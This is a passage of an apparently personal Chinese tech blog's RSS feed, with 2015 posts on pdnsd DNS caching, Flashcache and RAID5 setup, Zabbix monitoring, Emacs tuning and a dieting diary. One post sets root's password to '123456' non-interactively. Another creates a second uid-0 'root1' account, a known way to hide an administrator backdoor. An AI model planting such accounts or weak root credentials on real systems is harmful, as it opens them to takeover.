user found: {<span style="color: #8abeb7;">"id"</span>:1,<span style="color: #8abeb7;">"name"</span>:<span style="color: #8abeb7;">"txf"</span>,<span style="color: #8abeb7;">"male"</span>:<span style="color: #81a2be;">true</span>,<span style="color: #8abeb7;">"birthday"</span>:<span style="color: #8abeb7;">"1983-03-22T00:00:00.000</span><span style="color: #8abeb7; text-decoration: underline;">Z"</span><span style="text-decoration: underline;">}</span>
</pre>
</div>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用Pdnsd缓存域名解析结果加快上网速度]]></title>
            <link>/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html</link>
            <guid>/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html</guid>
            <pubDate>Tue, 23 Jun 2015 10:56:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>频繁的域名解析容易导致超时出错

<p>
在执行 <code>opkg-cl update</code> 或 <code>yaourt -Syua</code> 命令更新系统软件信息时，容易因为频繁的域名解析而导致更新速度奇慢甚至是超时出错，通过将要访问的域名添加到 <code>/etc/hosts</code> 中，可以立即解决这个问题。考虑到服务器IP可能会换，使用 <code>/etc/hosts</code> 非长久之计。
</p>
</li>

<li>缓存域名解析结果

<p>
更好的办法是缓存域名解析结果，一般来说后台服务程序可以通过缓存域名解析结果加快后继请求的处理，但是对于像 <code>opkg-cl</code> 、 <code>yaourt</code> 之类的工具程序，由于运行一次就退出了，要实现缓存域名解析结果就显得有点小题大作了，最好是在系统底层来实现，而不是每个应用程序都实现这个功能。
</p>

<p>
<a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 就是这样一款开源DNS代理服务程序，它安装在客户机上，对于客户端应用程序来说，它是DNS服务程序，对于真正的DNS服务来说它是DNS客户端程序。
</p>
</li>

<li><a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 安装

<div class="org-src-container">

<pre class="src src-sh">yaourt -S pdnsd
</pre>
</div>
</li>

<li><a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 运行

<div class="org-src-container">

<pre class="src src-sh">sudo systemctl enable pdnsd
sudo systemctl start pdnsd
</pre>
</div>
</li>

<li>客户机DNS设置

<p>
修改 <code>/etc/resolv.conf</code> 为如下内容：
</p>

<pre class="example">
nameserver 127.0.0.1
</pre>

<p>
对于 Archlinux <code>/etc/resolv.conf</code> 是由 <code>resolvconf</code> 工具生成，直接修改后随时可能被覆盖，可以修改 <code>/etc/resolvconf.conf</code> 将以下配置行取消注释：
</p>
<pre class="example">
# name_servers=127.0.0.1
</pre>

<p>
然后重新生成 <code>/etc/resolv.conf</code> 配置文件：
</p>
<div class="org-src-container">

<pre class="src src-sh">sudo resolvconf -u
</pre>
</div>
</li>

<li>看看效果

<p>
多次执行下面的命令，可以感觉到后几次明显比第一次快，这就是DNS缓存在起作用。
</p>

<div class="org-src-container">

<pre class="src src-sh">nslookup www.google.com
</pre>
</div>
</li>

<li>适合国内环境的配置（仅供参考）

<p>
将 <code>/etc/pdnsd.conf</code> 配置文件修改为以下内容：
</p>

<pre class="example">
global {
    perm_cache=1024;
    cache_dir="/var/cache/pdnsd";
    pid_file = /var/run/pdnsd.pid;
    run_as="pdnsd";
    server_ip = 127.0.0.1;
    status_ctl = on;
    query_method=udp_tcp;
    min_ttl=15m;
    max_ttl=1d;
    timeout=10;
    neg_domain_pol=on;
    udpbufsize=1024;
}

server {
    label = "root-servers";
    root_server = discover;
    randomize_servers = on;
    ip = 114.114.114.114,
         223.5.5.5,
         114.114.115.115,
         223.6.6.6;
    timeout = 5;
    uptest = query;
    interval = 30m;
    ping_timeout = 50;
    purge_cache = off;
    exclude = .localdomain;
    policy = included;
    preset = off;
}

source {
    owner=localhost;
    serve_aliases=on;
    file="/etc/hosts";
}

rr {
    name=localhost;
    reverse=on;
    a=127.0.0.1;
    owner=localhost;
    soa=localhost,root.localhost,42,86400,900,86400,86400;
}
</pre>

<p>
重启 <a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 生效配置：
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo systemctl restart pdnsd
</pre>
</div>
</li>

<li>参考

<p>
《<a href="http://venmos-com.qiniudn.com/blog/2013/06/19/pdnsd/">用Pdnsd快速打造无污染高速缓存DNS服务器</a>》</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[轻断食日（2015-6-16）]]></title>
            <link>/article/8f7b65ad98df65e5ff08-2015-6-16-ff09.html</link>
            <guid>/article/8f7b65ad98df65e5ff08-2015-6-16-ff09.html</guid>
            <pubDate>Tue, 16 Jun 2015 10:52:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
今天是第一次进行轻断食，昨天晚上10点多吃过水果后到现在还没有吃过东西，喝了一天的茶，除了偶尔觉得饿得发慌，一切安好，工作没有疲劳感效率很高，马上要吃晚饭了，希望不要吃得太多，按要求一天只能吃600卡的，等下可别吃超了哦。
</p>

<p>
现在肚子有饿的感觉，但是又感觉肚子有点涨，搞不清楚自已到底是不是真饿了。
</p>

<p>
现在刚好70公斤，希望慢慢瘦下来吧，过了今天明天就解放了。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux非交互方式修改用户密码]]></title>
            <link>/article/linux-975e4ea44e9265b95f0f4fee6539752862375bc67801.html</link>
            <guid>/article/linux-975e4ea44e9265b95f0f4fee6539752862375bc67801.html</guid>
            <pubDate>Tue, 16 Jun 2015 09:35:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
linux下的 <code>passwd</code> 命令是交互式运行的（密码需要由用户使用键盘输入），后台程序如果要改用户密码需要一定的技巧。
</p>

<p>
如：以下命令可以将 <code>root</code> 帐号的密码改为 <code>123456</code>
</p>

<div class="org-src-container">

<pre class="src src-sh">(<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'123456'</span>; sleep 1; <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'123456'</span>) | passwd <span style="color: #8abeb7;">'root'</span> &gt; /dev/null
</pre>
</div>

<p>
但是，此时也不好判断密码是否改成功了，需要验证一下。
</p>

<p>
参考文章《<a href="http://www.xinotes.net/notes/note/1833/">Check Linux user password in C</a> 》编写了以下程序用于非交互式修改密码：
</p>

<p>
<a href="../static/change_password.c">change_password.c</a>
</p>

<p>
编译：
</p>
<div class="org-src-container">

<pre class="src src-sh">gcc -g change_password.c -o change_password -lcrypt
</pre>
</div>

<p>
运行：
</p>
<div class="org-src-container">

<pre class="src src-sh">./change_password root 123456
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[ediary支持主页以及完成国际化（i18n）支持]]></title>
            <link>/article/ediary-652f63014e3b98754ee553ca5b8c621056fd96455316ff08-i18n-ff09652f6301.html</link>
            <guid>/article/ediary-652f63014e3b98754ee553ca5b8c621056fd96455316ff08-i18n-ff09652f6301.html</guid>
            <pubDate>Tue, 09 Jun 2015 07:04:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>完成主页支持

<p>
通过在配置文件中添加主页选项 <code>config.site.home</code> ，支持把某一个页面通过拷贝做为主页 <code>/index.html</code> 。
</p>
</li>

<li>完成国际化支持

<p>
按照文章 <a href="https://research.linagora.com/blog/?p=37">A strategy for i18n in node.js server templates</a> 的建议，选用 <a href="https://github.com/mashpie/i18n-node">i18n-node</a> 做为国际化方案，顺利完成英文及中文简体的支持。
</p>
</li>
</ul>

<p>
接下来要简化安装配置，并提供相关文档。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[ediary已基本可用正式在个人博客中启用]]></title>
            <link>/article/ediary-5df257fa672c53ef75286b635f0f57284e2a4eba535a5ba24e2d542f7528.html</link>
            <guid>/article/ediary-5df257fa672c53ef75286b635f0f57284e2a4eba535a5ba24e2d542f7528.html</guid>
            <pubDate>Mon, 08 Jun 2015 03:39:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
经过上周末的一翻努力，参考 <a href="http://medium.com/">medium</a> 的风格，对布局进行彻底的调整：
</p>

<ul class="org-ul">
<li>使用三层组织方式：category &gt; tag &gt; article
</li>

<li>article 去除干扰阅读的元素：标签云，网址中去除了时间信息
</li>

<li>category 放到一级菜单中，支持按 category 订阅
</li>

<li>移植 o-blog 中的sitemap功能
</li>
</ul>

<p>
接下来的任务是对主页进行正式支持，目前是手工拷贝了 category 的第一页做为首页，后面需要改为直接把 category 的第一页发布为首页，以及显示方面的BUG修复。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下创建另一个root帐号]]></title>
            <link>/article/linux-4e0b521b5efa53e64e004e2a-root-5e1053f7.html</link>
            <guid>/article/linux-4e0b521b5efa53e64e004e2a-root-5e1053f7.html</guid>
            <pubDate>Thu, 04 Jun 2015 12:27:00 GMT</pubDate>
            <content:encoded><![CDATA[<div class="org-src-container">

<pre class="src src-sh">useradd -g 0 -u 0 -o root1
</pre>
</div>

<p>
上面的命令创建了一个和 <code>root</code> 帐号几乎一模一样的帐号 <code>root1</code> ，这个帐号登录后甚至连 <code>$USER</code> 环境变量都是 <code>root=， 应该是由于 =uid</code> 和 <code>root</code> 帐号一样都是 <code>0</code> ，所以使用了 <code>root</code> 帐号的用户名，但是可以指定不同的 <code>HOME</code> 以及密码等。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[第二个任务以及移植 o-blog 主要功能顺利完成]]></title>
            <link>/article/7b2c4e8c4e2a4efb52a14ee553ca79fb690d-o-blog-4e3b8981529f80fd987a52295b8c6210.html</link>
            <guid>/article/7b2c4e8c4e2a4efb52a14ee553ca79fb690d-o-blog-4e3b8981529f80fd987a52295b8c6210.html</guid>
            <pubDate>Wed, 03 Jun 2015 06:45:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
o-blog 的相关特性进行了一番取舍：去掉了云标签独立页面，去掉了年/月发布列表页，去掉了最新文章侧边栏，去掉了文章页面的上一文章、下一文章链接，以及选择直接在标签侧边栏高亮相关标签，新增按标签订阅，新增主页。
</p>

<p>
接下来还有首页的页面需要按时间顺序排列，另外最好1号页码表示最旧的文章，这样发表新文章后文章所在的页码不会变来变去不利于收藏。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[第一个任务解析日志文件顺利完成]]></title>
            <link>/article/7b2c4e004e2a4efb52a189e3679065e55fd765874ef6987a52295b8c6210.html</link>
            <guid>/article/7b2c4e004e2a4efb52a189e3679065e55fd765874ef6987a52295b8c6210.html</guid>
            <pubDate>Sat, 30 May 2015 08:58:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
参考 <a href="https://github.com/renard/o-blog">o-blog</a> 的代码顺利完成任务，代码量很少不到40行。貌似 o-blog 很多解析org-mode的代码都是手写的，org-mode 支持一些便捷的API，可以减少很多代码量。
</p>

<p>
接下来要完的任务是org-mode格式的日记内容html化。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[今天开始ediary项目]]></title>
            <link>/article/4eca59295f0059cb-ediary-987976ee.html</link>
            <guid>/article/4eca59295f0059cb-ediary-987976ee.html</guid>
            <pubDate>Sat, 30 May 2015 07:26:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
又折腾了一上午的 <a href="https://github.com/renard/o-blog">o-blog</a> ，总是少了几个 <code>js</code> 文件，最近升级了 <code>emacs</code> 中的所有包后 <a href="http://blog.kankanan.com">我的博客</a> 总算是歇菜了，使用 <a href="https://github.com/renard/o-blog">o-blog</a> 写了两年博客，过程还是很愉快的，除了升级系统后偶尔会有兼容性问题，需要耗费时间修复外，写起博客来很方便，有时候工作相关的调研项目也忍不住发布到博客上，然后把链接发出去。不过考虑到我使用的系统（Archlinux）更新得太勤快了，使用的博客系统一定要够简单直观，我可以改得动。
</p>

<p>
我想是时候按自已的想法写一个类似的项目了，这个项目的核心功能一定要精简，专注于日记功能，最好能把展示层剥离出去， <code>jquery</code> 和 <code>bootstrap</code> 实在是太重了，展示日志用得着这么重的东西吗？
</p>

<p>
核心应该是数据结构，日志的信息包含：标题（title）、标签（tags）、发布日期（timestamp）、正文（source）加上可选的短名称（slug）用于生成链接。而最基础的功能就是从日志文本中提取这些信息。接下来根据这些信息来生成待发布的日志文件，以及与现有的发布系统（如：wordpress、git pages）的对接就可以独立进行开发了，而且应该可以互相替换。
</p>

<p>
接下来要完成的第一个任务就是解析本日志文件。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Zabbix添加Flashcache监控]]></title>
            <link>/article/zabbix-6dfb52a0-flashcache-76d163a7.html</link>
            <guid>/article/zabbix-6dfb52a0-flashcache-76d163a7.html</guid>
            <pubDate>Fri, 29 May 2015 08:27:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">下载 <code>Zabbix</code> 的 <code>Flashcache</code> 开源模板</h2>
<div class="outline-text-2" id="text-1">
<div class="org-src-container">

<pre class="src src-sh">git clone https://github.com/lesovsky/zabbix-extensions.git
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">设置 <code>zabbix_agentd</code></h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#23433;&#35013;&#37197;&#32622;&#25991;&#20214;</span>
cp zabbix-extensions/files/flashcache/flashcache.conf /usr/local/etc/zabbix_agen<span style="text-decoration: underline;">td.conf.d/</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#23433;&#35013;&#33050;&#26412;</span>
mkdir /usr/local/etc/zabbix_scripts
cp zabbix-extensions/files/flashcache/scripts/* /usr/local/etc/zabbix_scripts/
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#20462;&#25913;&#37197;&#32622;&#25991;&#20214;&#20013;&#24341;&#29992;&#30340;&#33050;&#26412;&#36335;&#24452;</span>
sed --in-place -e <span style="color: #8abeb7;">'s/\/usr\/libexec\/zabbix-extensions\//\/usr\/local\/etc\/zabb</span><span style="color: #8abeb7; text-decoration: underline;">ix_/g'</span><span style="text-decoration: underline;"> /usr/local/etc/zabbix_agentd.conf.d/flashcache.conf</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#21253;&#21547;&#37197;&#32622;&#25991;&#20214;&#30446;&#24405;</span>
sed --in-place -e <span style="color: #8abeb7;">'s/# Include=\/usr\/local\/etc\/zabbix_agentd\.conf\.d\//Inclu</span><span style="color: #8abeb7; text-decoration: underline;">de=\/usr\/local\/etc\/zabbix_agentd\.conf\.d\//g'</span><span style="text-decoration: underline;"> /usr/local/etc/zabbix_agentd.conf</span>
</pre>
</div>

<p>
重启 <code>zabbix_agentd</code> 生效配置。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">设置 <code>Zabbix</code> 后台</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li>导入 <code>Flashcache</code> 模板

<p>
Configuration -&gt; Templates -&gt; Import -&gt; Import file 选择之前下载的 <code>zabbix-extensions/files/flashcache/flashcache-template.xml</code>
</p>
</li>

<li>应用 <code>Flashcache</code> 模板

<p>
Configuration -&gt; Hosts 下选择要应用到的主机 -&gt; Templates -&gt; Link new templates 选择 <code>Flashcache-Template</code></p>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[emacs启动速度优化]]></title>
            <link>/article/emacs-542f52a8901f5ea64f185316.html</link>
            <guid>/article/emacs-542f52a8901f5ea64f185316.html</guid>
            <pubDate>Sun, 24 May 2015 03:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
emacs装了很多插件后，启动越来越慢了，最近发现启动一次要25秒，赶得上操作系统启动时间了，是时候优化一下启动速度了。
</p>

<ul class="org-ul">
<li>裸启动emacs

<div class="org-src-container">

<pre class="src src-sh">emacs --quick
</pre>
</div>

<p>
尽然耗时10秒，网上查了一下这个问题常见于 <code>archlinux</code> ，是网络配置引起: <a href="https://wiki.archlinux.org/index.php/Emacs#Incorrect_network_configuration">Emacs - Slow startup - Incorrect network configuration</a>
</p>

<p>
解决方案就是将主机名（ <code>hostname</code> 命令输出）加到 <code>/etc/hosts</code> 中：
</p>

<pre class="example">
127.0.0.1   localhost.localdomain   localhost &lt;hostame&gt;
::1     localhost.localdomain   localhost  &lt;hostname&gt;
</pre>

<p>
再试，emacs瞬间启动。
</p>
</li>

<li>不加载个人配置文件启动emacs

<div class="org-src-container">

<pre class="src src-sh">emacs --no-init-file
</pre>
</div>

<p>
emacs瞬间启动。
</p>
</li>

<li>不加载最近保存的桌面启动emacs

<div class="org-src-container">

<pre class="src src-sh">emacs --no-desktop
</pre>
</div>

<p>
耗时15秒，看来是个人配置的问题了
</p>
</li>

<li>从前面开始一块一块反注释emacs配置，看是卡在哪里

<div class="org-src-container">

<pre class="src src-lisp">(<span style="color: #b5bd68;">require</span> '<span style="color: #81a2be;">anything-config</span>)
</pre>
</div>

<p>
这一句耗时11秒，注释掉，现在启时时间为5秒，可以接受了。</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Flashcache优化]]></title>
            <link>/article/flashcache-4f185316.html</link>
            <guid>/article/flashcache-4f185316.html</guid>
            <pubDate>Fri, 22 May 2015 10:12:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>调整 dev.flashcache.&lt;cache name&gt;.dirty_thresh_pct

<p>
脏缓存回写阈值（百分比），默认 <code>20</code> 。
</p>

<p>
仅 <code>Write-Back</code> 模式下有效。
</p>

<p>
调大该值可以减轻写压力（缓存数据写入HDD及元数据写入SSD），缓存已满时该缓存块不能被淘汰，减少了可用缓存空间。
</p>

<p>
如果最近写入的数据很可能是热数据，可以考虑调大该值，建议调到 <code>90</code> ：
</p>

<div class="org-src-container">

<pre class="src src-sh">sysctl -w dev.flashcache.&lt;cache name&gt;.dirty_thresh_pct=90
</pre>
</div>
</li>

<li>调整 dev.flashcache.reclaim_policy

<p>
缓存空间回收策略，默认 <code>FIFO(0)</code> 。
</p>

<p>
改为 <code>LRU(1)</code> :
</p>

<div class="org-src-container">

<pre class="src src-sh">sysctl -w dev.flashcache.&lt;cache name&gt;.reclaim_policy=1
</pre>
</div>
</li>

<li>辅助调试

<ul class="org-ul">
<li>统计清零

<div class="org-src-container">

<pre class="src src-sh">sysctl -w dev.flashcache.&lt;cache name&gt;.zero_stats=1
</pre>
</div>
</li>

<li>快速停止

<p>
Flashcache在停止时会将SSD中的脏数据写回到HDD中，这是非常耗时的，会导致关机慢。
</p>

<p>
手工快速停止
</p>

<div class="org-src-container">

<pre class="src src-sh">service flashcache forcestop
</pre>
</div>

<p>
总是快速停止
</p>

<div class="org-src-container">

<pre class="src src-sh">sysctl -w dev.flashcache.sdb+sdc1.fast_remove=1
</pre>
</div>
</li>
</ul>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[FlashCache多盘方案实战]]></title>
            <link>/article/flashcache-591a76d865b968485b9e6218.html</link>
            <guid>/article/flashcache-591a76d865b968485b9e6218.html</guid>
            <pubDate>Wed, 29 Apr 2015 09:38:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
目标系统为单SSD+多HDD，将多HDD创建为RAID5逻辑盘，然后使用FlashCache将SSD做为RAID5逻辑盘的缓存。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">系统信息</h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>OS

<p>
CentOS release 6.5 (Final) x86_64
</p>
</li>

<li>CPU

<p>
8
</p>

<p>
Intel(R) Atom(TM) CPU  C2750  @ 2.40GHz
</p>
</li>

<li>MEMORY

<p>
4
</p>

<p>
TOTAL 16G
</p>
</li>

<li>HDD

<p>
4
</p>

<p>
WDC WD4000FYYZ-0 4TB 7200转
</p>

<p>
/dev/sdc /dev/sdd /dev/sde /dev/sdf
</p>
</li>

<li>SSD

<p>
1
</p>

<p>
INTEL SSDSC2BB30 300GB
</p>

<p>
/dev/sdb
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">卸载HDD及SSD盘</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh">umount /dev/sdc /dev/sdd /dev/sde /dev/sdf /dev/sdb
</pre>
</div>

<p>
确保系统重启后不会自动挂载这些盘。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">将多HDD创建为RAID5逻辑盘</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li>格式化HDD盘

<div class="org-src-container">

<pre class="src src-sh">parted /dev/sdc
(parted) mklabel gpt
(parted) unit TB
(parted) mkpart primary 0.00TB 4.00TB
(parted) print
</pre>
</div>

<p>
其它HDD盘也做如上处理.
</p>
</li>

<li>创建RAID5逻辑分区

<div class="org-src-container">

<pre class="src src-sh">mdadm --create /dev/md0 --level=raid5 --raid-devices=4 /dev/sd[c-f]1
parted /dev/md0
(parted) mklabel gpt
(parted) unit TB
(parted) mkpart primary 0.00TB 12.00TB
(parted) print
(parted) quit
</pre>
</div>
</li>

<li>保存RAID5配置

<div class="org-src-container">

<pre class="src src-sh">mdadm --detail --scan &gt; /etc/mdadm.conf
</pre>
</div>

<p>
参考：<a href="https://raid.wiki.kernel.org/index.php/RAID_setup#Saving_your_RAID_configuration">Saving your RAID configuration</a>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">安装Flashcache</h2>
<div class="outline-text-2" id="text-4">
<div class="org-src-container">

<pre class="src src-sh">wget https://github.com/facebook/flashcache/archive/stable_v3.1.3.zip -O flashca<span style="text-decoration: underline;">che_stable_v3.1.3.zip</span>
unzip flashcache_stable_v3.1.3.zip
<span style="color: #b294bb;">cd</span> flashcache-stable_v3.1.3
make
make install
modprobe flashcache
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">创建Flashcache混合设备</h2>
<div class="outline-text-2" id="text-5">
<div class="org-src-container">

<pre class="src src-sh">flashcache_create -p around cachedev /dev/sdb /dev/md0p1
mkfs.ext4 /dev/mapper/cachedev
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">挂载Flashcache混合设备</h2>
<div class="outline-text-2" id="text-6">
<div class="org-src-container">

<pre class="src src-sh">mkdir /data
mount /dev/mapper/cachedev /data
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-7" class="outline-2">
<h2 id="sec-7">系统重启后需要重新创建并挂载Flashcache设备</h2>
<div class="outline-text-2" id="text-7">
<div class="org-src-container">

<pre class="src src-sh">flashcache_create -p around cachedev /dev/sdb /dev/md0p1
mount /dev/mapper/cachedev /data
</pre>
</div>

<p>
注意：使用除 <code>writethrough</code> 和 <code>writearound</code> 以外的模式需要使用 <code>flashcache_load</code> 重新创建设备。
</p>
</div>
</div>

<div id="outline-container-sec-8" class="outline-2">
<h2 id="sec-8">写入速度测试</h2>
<div class="outline-text-2" id="text-8">
<p>
循环创建60MiB大小的文件，测得的磁盘写入速度为 <b>35.6MiB</b> ，磁盘读取速度为 <b>2.1MiB</b> 。
</p>
</div>
</div>

<div id="outline-container-sec-9" class="outline-2">
<h2 id="sec-9">读取速度测试</h2>
<div class="outline-text-2" id="text-9">
<ul class="org-ul">
<li>500并发120G文件每次读取32KB顺序读取

<ul class="org-ul">
<li>请求处理速度

<p>
2107
</p>
</li>

<li>传输速度

<p>
132.35MiB/s
</p>
</li>
</ul>
</li>

<li>500并发500G文件每次读取32KB顺序读取

<ul class="org-ul">
<li>请求处理速度

<p>
1937
</p>
</li>

<li>传输速度

<p>
61.09MiB
</p>
</li>
</ul>
</li>

<li>500并发1T文件每次读取32KB顺序读取

<ul class="org-ul">
<li>请求处理速度

<p>
1574
</p>
</li>

<li>传输速度

<p>
49.64MiB/s
</p>
</li>
</ul>
</li>

<li>500并发120G文件每次读取64KB顺序读取

<ul class="org-ul">
<li>请求处理速度

<p>
5006
</p>
</li>

<li>传输速度

<p>
157.88MiB/s
</p>
</li>
</ul>
</li>

<li>500并发500G文件每次读取64KB顺序读取

<ul class="org-ul">
<li>请求处理速度

<p>
897
</p>
</li>

<li>传输速度

<p>
56.37MiB/s
</p>
</li>
</ul>
</li>

<li>500并发1T文件每次读取64KB顺序读取

<ul class="org-ul">
<li>请求处理速度

<p>
782
</p>
</li>

<li>传输速度

<p>
49.10MiB/s
</p>
</li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-10" class="outline-2">
<h2 id="sec-10">注意事项</h2>
<div class="outline-text-2" id="text-10">
<ul class="org-ul">
<li>重建（rebuild）

<p>
当一块盘坏掉后，如果配置了热备盘（Hot spare disk），会自动重建，请将坏盘换掉并配置成热备盘；\
如果未配置热备盘，读性能会下降（坏盘中的数据需要全部通过计算重现），请将坏盘换掉系统会自动进行重建。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-11" class="outline-2">
<h2 id="sec-11">潜在的优化选项</h2>
<div class="outline-text-2" id="text-11">
<ul class="org-ul">
<li>开启SSD写Cache
</li>

<li>禁用文件、目录访问时间戳

<p>
noatime,nodiratime
</p>
</li>

<li><code>Write-Back</code> 模式优化

<div class="org-src-container">

<pre class="src src-sh">sysctl -w dev.flashcache.sdb+md0p1.dirty_thresh_pct=80
</pre>
</div>
</li>
</ul>
</div>
</div>


<div id="outline-container-sec-12" class="outline-2">
<h2 id="sec-12">卸载Flashcache设备</h2>
<div class="outline-text-2" id="text-12">
<div class="org-src-container">

<pre class="src src-sh">umount /dev/mapper/cachedev
dmsetup remove cachedev
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-13" class="outline-2">
<h2 id="sec-13">Q&amp;A</h2>
<div class="outline-text-2" id="text-13">
<ul class="org-ul">
<li>重新调整 Flashcache 选项会不会删除数据？

<p>
<code>writethrough</code> 、 <code>writearound</code> 模式不会，其它的会。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-14" class="outline-2">
<h2 id="sec-14">相关参考</h2>
<div class="outline-text-2" id="text-14">
<dl class="org-dl">
<dt> 《<a href="http://lzw.me/a/linux-lvm.html">Linux LVM逻辑卷管理详细介绍</a>》 </dt><dd>非常好的LVM入门文章
</dd>

<dt> 《<a href="http://www.linux-mag.com/id/7582/">Pick Your Pleasure: RAID-0 mdadm Striping or LVM Striping?</a>》 </dt><dd>LVM与RAID-0的比较
</dd>

<dt> 《<a href="http://www.tecmint.com/create-raid0-in-linux/">Creating Software RAID0 (Stripe) on ‘Two Devices’ Using ‘mdadm’ Tool in Linux – Part 2</a>》 </dt><dd>构建RAID-0教程
</dd>

<dt> 《<a href="http://zengrong.net/post/2014.htm">在CentOS 6.1上配置 4TB硬盘+RAID1</a>》 </dt><dd>使用 <code>parted</code> 代替 <code>fdisk</code> 对大于2TB的硬盘进行分区
</dd>

<dt> 《<a href="http://wiki.mikejung.biz/Software_RAID">Software RAID - How to Optimize Software RAID on Linux using Mdadm</a>》 </dt><dd>优化RAID
</dd>

<dt> 《<a href="http://sysadmin.blog.51cto.com/83876/236802">RAID5单盘故障读写分析</a>》 </dt><dd>RAID5一块盘坏掉后的情形分析
</dd>
</dl>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在Archlinux上使用FlashCache]]></title>
            <link>/article/5728-archlinux-4e0a4f7f7528-flashcache.html</link>
            <guid>/article/5728-archlinux-4e0a4f7f7528-flashcache.html</guid>
            <pubDate>Thu, 23 Apr 2015 12:16:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="https://github.com/facebook/flashcache/">Flashcache</a> 是 <a href="https://www.facebook.com">Facebook</a> 的一个开源项目，通过将固态硬盘（SSD）做为机械硬盘（HDD）的缓存层，提升磁盘I/O性能。
</p>

<p>
<a href="https://github.com/facebook/flashcache/">Flashcache</a> 位于磁盘驱动层与文件系统层之间，是一个 <code>linux</code> 内核模块。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">编译安装</h2>
<div class="outline-text-2" id="text-1">
<p>
由于Archlinux总是使用最新的linux内核，最好从最新的 <a href="https://github.com/facebook/flashcache/">Flashcache</a> 源代码进行编译安装。
</p>

<div class="org-src-container">

<pre class="src src-sh">git clone https://github.com/facebook/flashcache.git
<span style="color: #b294bb;">cd</span> flashcache
make
sudo make install
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">挂载模块</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh">sudo insmod /lib/modules/<span style="color: #b294bb;">`uname -r`</span>/extra/flashcache/flashcache.ko
</pre>
</div>

<ul class="org-ul">
<li>修复挂载错误

<blockquote>
<p>
insmod: ERROR: could not insert module /lib/modules/3.19.3-3-ARCH/extra/flashcache/flashcache.ko: Unknown symbol in module
</p>
</blockquote>

<p>
通过 <code>dmesg | grep flashcache</code> 可以看到以下错误信息：
</p>

<blockquote>
<p>
[ 2130.514615] flashcache: Unknown symbol dm_put_device (err 0)<br  />
       [ 2130.514654] flashcache: Unknown symbol dm_io_client_create (err 0)<br  />
       [ 2130.514693] flashcache: Unknown symbol dm_kcopyd_client_create (err 0)<br  />
       [ 2130.514738] flashcache: Unknown symbol dm_unregister_target (err 0)<br  />
       [ 2130.514774] flashcache: Unknown symbol dm_io_client_destroy (err 0)<br  />
